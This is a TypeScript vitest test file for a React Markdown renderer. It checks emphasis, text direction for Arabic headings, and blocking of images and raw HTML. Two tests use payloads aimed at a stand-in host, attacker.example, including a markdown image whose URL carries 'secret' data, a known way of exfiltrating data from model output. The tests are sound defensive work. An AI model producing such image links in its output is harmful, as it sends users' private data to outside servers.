import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown } from "./markdown";

const render = (text: string) => renderToStaticMarkup(createElement(Markdown, null, text));

describe("Markdown", () => {
  it("renders emphasis", () => {
    expect(render("up to **two days**")).toContain("<strong>two days</strong>");
  });

  it("never renders images from model or document text", () => {
    const html = render("Answer ![leak](https://attacker.example/p?d=secret)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("leak");
  });

  it("gives headings automatic direction for Arabic", () => {
    expect(render("## سياسة الإجازات")).toContain('dir="auto"');
  });

  it("does not render raw HTML", () => {
    expect(render('<img src="https://attacker.example/x">')).not.toContain("<img");
  });
});
